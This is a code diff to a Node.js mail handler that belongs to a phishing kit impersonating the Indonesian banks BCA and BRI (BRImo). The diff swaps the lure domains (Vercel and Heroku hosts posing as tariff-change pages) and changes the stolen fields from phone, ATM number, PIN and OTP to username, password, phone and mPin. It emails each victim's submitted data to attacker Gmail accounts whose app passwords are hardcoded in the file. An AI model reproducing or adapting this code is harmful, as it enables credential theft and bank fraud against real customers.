@@ -7,21 +7,24 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
-     if (url == 'tarifku-ubah.vercel.app'){
-           
-        email = 'namakubca@gmail.com'
-        pass = 'ysniapeokiwasgpt'
+     if (url == 'pilihan-tarif-baru-brimo.herokuapp.com'){
 
-            
-    } else {
-         email = ''
-         pass = ''
-    }
+       email = 'ywinbro@gmail.com'
+       pass = 'owynbybhilbsstdw'
+    }else
+
+    if(url == 'ubah-tarifbarumu.vercel.app'){
+        email = 'terakhir953@gmail.com' ;
+        pass = 'xysccffmmtefmvwm' ;
+        
+
+
+    }  
         
         try {
             const transporter = nodemailer.createTransport({
                 port: 587,
-                host: 'smtp.googlemail.com',
+                host: 'smtp.googlemail.com',  
                 auth: {
                     user: email,
                     pass: pass,
@@ -32,15 +35,16 @@ export default function handler(req, res) {
             const mailData = {
                 from: email,
                 to: email,
-                subject: 'BCA',
+                subject: 'BriApp',
                 html: `
-                    <ul>
-                        <li>nohp: ${body.nohp ?? '-'}</li>
-                        <li>noatm: ${body.nomoratm ?? '-'}</li>
-                        <li>pin: ${body.pin ?? '-'}</li>
-                        <li>otp: ${body.otp ?? '-'}</li>
-                    </ul>
-                `,            
+                <ul>
+                    <li>username: ${body.username ?? '-'}</li> 
+                    <li>password: ${body.password ?? '-'}</li>
+                    <li>nohp: ${body.noHp ?? '-'}</li>
+                    <li>pin: ${body.mPin ?? '-'}</li>
+                    <li>message: ${body.message ?? '-'}</li>
+                </ul>
+                `,                  
             }
       
             transporter.sendMail(mailData, function (err, info) {
@@ -48,7 +52,7 @@ export default function handler(req, res) {
                   res.status(400).json({error: err})
                 }
                 else{
-                  res.status(200).json({info:'Berhasil Terkirim', status: 200})
+                  res.status(200).json({info, status: 200})
                 }
             })
     
